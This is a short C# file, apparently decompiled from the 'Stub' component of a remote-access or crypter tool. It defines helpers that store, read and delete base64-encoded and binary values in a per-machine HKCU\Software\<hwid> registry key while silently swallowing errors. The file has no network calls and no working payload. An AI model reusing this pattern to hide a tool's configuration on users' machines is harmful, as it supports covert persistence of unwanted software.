using System;
using System.Text;
using Microsoft.Win32;
using Stub.Helper.CryptString;

namespace Stub.Helper
{
	// Token: 0x02000024 RID: 36
	public class SetRegistry
	{
		// Token: 0x060000B8 RID: 184 RVA: 0x000063B4 File Offset: 0x000045B4
		public static bool CheckValue(string name)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID, RegistryKeyPermissionCheck.ReadWriteSubTree))
				{
					if (registryKey.GetValue(name) != null)
					{
						return true;
					}
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x00006410 File Offset: 0x00004610
		public static bool SetValue(string name, string value)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software", RegistryKeyPermissionCheck.ReadWriteSubTree))
				{
					if (SetRegistry.CheckValue(name))
					{
						registryKey.DeleteValue(name);
					}
					registryKey.SetValue(name, Convert.ToBase64String(Encoding.UTF8.GetBytes(value)));
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x060000BA RID: 186 RVA: 0x0000648C File Offset: 0x0000468C
		public static bool SetValue(string name, byte[] value)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID, RegistryKeyPermissionCheck.ReadWriteSubTree))
				{
					if (SetRegistry.CheckValue(name))
					{
						registryKey.DeleteValue(name);
					}
					registryKey.SetValue(name, value);
					return true;
				}
			}
			catch
			{
			}
			return false;
		}

		// Token: 0x060000BB RID: 187 RVA: 0x000064F4 File Offset: 0x000046F4
		public static string GetValueStr(string value)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software"))
				{
					return Encoding.UTF8.GetString(Convert.FromBase64String((string)registryKey.GetValue(value)));
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x060000BC RID: 188 RVA: 0x00006560 File Offset: 0x00004760
		public static byte[] GetValue(string value)
		{
			try
			{
				using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(SetRegistry.ID))
				{
					return (byte[])registryKey.GetValue(value);
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x0400002D RID: 45
		public static string ID = @"Software\" + Settings.hwid;
	}
}
